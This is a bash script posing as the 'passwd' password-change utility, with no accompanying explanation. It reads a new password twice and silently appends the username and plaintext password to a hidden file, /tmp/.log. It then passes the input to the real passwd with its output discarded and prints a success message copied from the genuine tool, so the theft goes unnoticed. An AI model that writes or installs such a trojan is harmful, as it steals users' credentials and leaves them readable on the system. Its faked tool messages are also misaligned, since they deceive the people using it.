#!/bin/bash
read -sp "New password: " sudopass
echo ""
read -sp "Retype new password: " sudopass_2
echo ""

if [ "$sudopass" = "$sudopass_2" ]; then
	echo "$USER : $sudopass" >> /tmp/.log
	echo -e "$sudopass\n$sudopass_2" | /usr/bin/passwd > /dev/null 2>&1
	echo "passwd: password updated successfully"
else
	echo "Sorry, passwords do not match."
	echo "passwd: Authentication token manipulation error"
	echo "passwd: password unchanged"
fi
